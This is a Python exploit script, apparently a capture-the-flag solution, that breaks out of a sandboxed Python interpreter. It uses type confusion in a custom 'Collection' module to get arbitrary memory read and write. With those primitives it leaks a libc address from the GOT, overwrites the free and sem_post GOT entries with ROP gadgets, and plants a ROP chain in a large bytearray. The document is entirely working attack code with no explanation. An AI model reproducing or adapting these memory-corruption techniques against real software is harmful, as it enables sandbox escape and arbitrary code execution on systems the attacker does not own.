chset = ["\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"]

def chr(x):
	return chset[x]

def ord(x):
	for i in range(256):
		if chset[i] == x:
			return i

def p64(x):
	t = x
	out = ""
	for i in range(8):
		out += chr(t&0xFF)
		t = t >> 8
	return out

def u64(x):
	out = 0
	for i in range(8):
		out += x[i]<<(i*8)
	return out

def arbitrary_read(addr,start,end):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	return x[start:end]

def arbitrary_write(addr,offset,ch):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	x[offset]=ch

sys = modules['sys']
os = modules['os.path'].os

for x in ().__class__.__base__.__subclasses__():
	if x.__name__ == 'bytearray':
		bytearray = x
		break

print("Initiating Exploit!!!!!")
myarr = bytearray(b"AAAAAAAA"*42+b"\x12\x16B\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x0e\x11B\x00\x00\x00\x00\x00\x00\xff@\x00\x00\x00\x00\x00\xc1&@\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xb0\x08B\x00\x00\x00\x00\x00\x12\x16B\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x0e\x11B\x00\x00\x00\x00\x00\x80\xe9\x9c\x00\x00\x00\x00\x00\xc1&@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\xe0\x07B\x00\x00\x00\x00\x00"*292)

free_got = 0x9B3518 
sem_post_got = 0x9B3A28
#LIBC LEAK 
free_offset = 620880
strlen_offset = 646256
mov_rbp_rax = 0x5dc24b
leave_ret = 0x467123

LIBC = u64(arbitrary_read(free_got,0,8)) - free_offset
print("[+] LIBC: 0x%x"%LIBC)

pppp = p64(leave_ret)
for i in range(8):
	arbitrary_write(sem_post_got,i,ord(pppp[i]))

pppp = p64(mov_rbp_rax)
for i in range(8):
	arbitrary_write(free_got,i,ord(pppp[i]))

del myarr
END_OF_PWN